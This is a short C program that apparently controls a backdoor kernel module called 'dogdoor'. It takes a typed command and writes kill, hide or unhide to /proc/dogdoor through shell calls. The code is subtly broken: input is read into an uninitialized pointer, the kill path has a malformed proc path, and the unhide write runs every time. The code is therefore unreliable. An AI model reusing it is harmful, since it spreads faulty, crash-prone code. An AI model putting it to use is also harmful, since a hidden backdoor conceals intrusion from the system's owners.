#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
	
	char *str; 

	//get command
	printf("Put command: \n") ;
	scanf("%s", str);
	
	char kill[] = "kill";
	char hide[] = "hide";
	char unhide[] = "unhide";

	//command is kill
	if (strncmp(str, kill, 4)==0) 
		system("bash -c 'echo kill > /proc dogdoor'");

	//command is hide or unhide
	if (strcmp(str, hide)==0)
		system("bash -c 'echo hide > /proc/dogdoor'");

	system("bash -c 'echo unhide > /proc/dogdoor'");
}	

